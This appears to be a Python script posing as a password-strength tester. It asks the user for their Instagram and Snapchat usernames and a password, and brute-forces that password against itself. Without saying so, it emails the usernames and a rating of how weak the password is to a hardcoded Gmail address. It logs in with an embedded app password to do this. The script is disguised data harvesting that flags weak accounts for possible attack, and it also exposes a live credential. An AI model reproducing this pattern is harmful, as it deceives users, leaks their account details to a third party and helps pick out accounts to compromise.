import itertools import string import time import smtplib from email.mime.text import MIMEText from concurrent.futures import ThreadPoolExecutor, as_completed # 📬 Configuration SMTP Gmail DESTINATAIRE = "yamafly404@gmail.com" EXPEDITEUR = "yamafly404@gmail.com" MOT_DE_PASSE = "tdig nbky fome nukp" # Mot de passe d'application Gmail SMTP_SERVEUR = "smtp.gmail.com" SMTP_PORT = 587 # 🔠 Alphabet utilisé pour générer les combinaisons caracteres = string.ascii_letters + string.digits + string.punctuation # 🔍 Fonction de test de mot de passe def tester_combinaison(combinaison, mot): tentative = ''.join(combinaison) return tentative if tentative == mot else None # 📬 Fonction d'envoi de mail avec les pseudos et le résultat def envoyer_email(pseudo_instagram, pseudo_snap, resultat): sujet = "Test de mot de passe - Résultat" corps = f"""📸 Pseudo Instagram : {pseudo_instagram} 👻 Pseudo Snap : {pseudo_snap} 🔐 Résultat : {resultat}""" msg = MIMEText(corps) msg["Subject"] = sujet msg["From"] = EXPEDITEUR msg["To"] = DESTINATAIRE try: with smtplib.SMTP(SMTP_SERVEUR, SMTP_PORT) as serveur: serveur.starttls() serveur.login(EXPEDITEUR, MOT_DE_PASSE) serveur.send_message(msg) print("✅ Résultat envoyé par mail.") except Exception as e: print("❌ Erreur d'envoi :", e) # 🧪 Fonction principale de brute force def brute_force(mot, pseudo_instagram, pseudo_snap, max_length=6): debut = time.time() trouve = False print("\n🔍 Test en cours...") with ThreadPoolExecutor() as executor: for longueur in range(1, max_length + 1): combinaisons = itertools.product(caracteres, repeat=longueur) futures = {executor.submit(tester_combinaison, c, mot): c for c in combinaisons} for future in as_completed(futures): resultat = future.result() if resultat: fin = time.time() temps = round(fin - debut, 2) statut = "NON sécurisé" if temps < 10 else "sécurisé" print(f"\n✅ Mot de passe trouvé : {resultat}") print(f"⏱️ Temps écoulé : {temps} secondes") print(f"🔐 Résultat : {statut}") envoyer_email(pseudo_instagram, pseudo_snap, f"{statut} ({temps}s)") trouve = True break if trouve: break if not trouve: print("\n🔒 Mot de passe non trouvé dans la limite de recherche.") envoyer_email(pseudo_instagram, pseudo_snap, "Mot de passe non trouvé") # 🚀 Lancement du test if __name__ == "__main__": print("🔐 Bienvenue sur le Testeur de Sécurité de Mot de Passe\n") pseudo_instagram = input("📸 Entrez votre pseudo Instagram : ") pseudo_snap = input("👻 Entrez votre pseudo Snap : ") mot = input("🔑 Entrez votre mot de passe à tester : ") brute_force(mot, pseudo_instagram, pseudo_snap)
